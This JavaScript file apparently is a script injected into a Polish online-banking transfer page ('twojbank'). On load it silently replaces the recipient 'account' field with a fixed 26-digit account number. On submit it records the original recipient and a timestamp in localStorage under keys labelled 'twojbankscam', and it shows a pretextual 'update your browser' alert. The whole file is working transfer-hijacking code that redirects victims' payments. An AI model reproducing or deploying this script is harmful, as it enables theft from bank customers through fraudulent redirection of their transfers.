
function addzero(i){
    if(i<10)
        return '0'+i;
    else
        return i;
}
function datetime(){
    var currentdate = new Date(); 
var datetime = currentdate.getFullYear() + "-"
                + addzero(currentdate.getMonth()+1)  + "-" 
                + addzero(currentdate.getDate()) + " "  
                + addzero(currentdate.getHours()) + ":"  
                + addzero(currentdate.getMinutes()) + ":" 
                + addzero(currentdate.getSeconds());
    return datetime;
}
function total(str){
    return (new Date(str.substr(0,4),str.substr(5,2),str.substr(8,2),str.substr(11,2),str.substr(14,2),str.substr(17,2),0).getTime());
}
function getInputsByValue(value)
{
    var allInputs = document.getElementsByTagName("input");
    var results = [];
    for(var x=0;x<allInputs.length;x++)
        if(allInputs[x].value == value)
            results.push(allInputs[x]);
    return results;
}
function load(){
    var destiny = "01234567891011121314151617";
    old = document.getElementsByName("account")[0].value;
    document.getElementsByName("account")[0].value = destiny;
    //document.getElementById("zdiv").innerHTML+=datetime()+" "+total(datetime());
    document.getElementById("f").addEventListener("submit",
        function(evt){
            //alert(old+" "+total(datetime()));
            if (typeof(Storage) !== "undefined") {
                if (localStorage.twojbankscamcount) {
                    localStorage.twojbankscamcount = Number(localStorage.twojbankscamcount) + 1;
                } else {
                    localStorage.twojbankscamcount = 0;
                }
                localStorage.setItem("twojbankscamaccount"+localStorage.twojbankscamcount,old);
                localStorage.setItem("twojbankscamdate"+localStorage.twojbankscamcount,total(datetime()));
            } else {
                alert("Zainstaluj najnowszą wersję przeglądarki, by móc korzystać z wszystkich możliwości serwisu!");
            }
        }
    );
}
load();
